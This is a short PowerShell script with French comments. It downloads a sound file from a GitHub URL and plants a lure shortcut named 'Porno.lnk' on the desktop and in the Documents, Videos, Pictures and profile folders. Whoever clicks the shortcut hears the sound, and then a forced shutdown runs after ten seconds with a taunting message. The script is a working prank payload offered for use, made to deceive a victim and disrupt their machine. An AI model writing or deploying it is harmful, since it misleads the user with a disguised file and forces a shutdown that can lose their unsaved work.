# Chemin vers le fichier audio
$soundUrl = "https://github.com/ertvg/h/raw/main/orgasm.wav"  # URL directe pour le fichier son
$soundPath = "$env:TEMP\orgasm.wav"  # Chemin local temporaire pour le fichier téléchargé

# Télécharger le fichier son
Write-Host "Téléchargement du fichier son..."
Invoke-WebRequest -Uri $soundUrl -OutFile $soundPath

# Créer le raccourci sur le bureau
$WshShell = New-Object -comObject WScript.Shell
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$Shortcut = $WshShell.CreateShortcut("$DesktopPath\Porno.lnk")

# Définir les propriétés du raccourci
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-c (New-Object Media.SoundPlayer '$soundPath').PlaySync(); shutdown /S /T 10 /C 'Cochon va !'"
$Shortcut.WorkingDirectory = "C:\"
$Shortcut.IconLocation = "C:\WINDOWS\system32\imageres.dll, 3"
$Shortcut.Save()

# Copier le raccourci dans d'autres dossiers
$folders = @(
    [Environment]::GetFolderPath("UserProfile"),       # Dossier utilisateur principal
    [Environment]::GetFolderPath("MyDocuments"),       # Dossier Documents
    [Environment]::GetFolderPath("MyVideos"),          # Dossier Vidéos
    [Environment]::GetFolderPath("MyPictures")         # Dossier Images
)

foreach ($folder in $folders) {
    Copy-Item -Path "$DesktopPath\Porno.lnk" -Destination "$folder\Porno.lnk" -Force
}

Write-Host "Raccourci créé et copié dans les dossiers spécifiés."
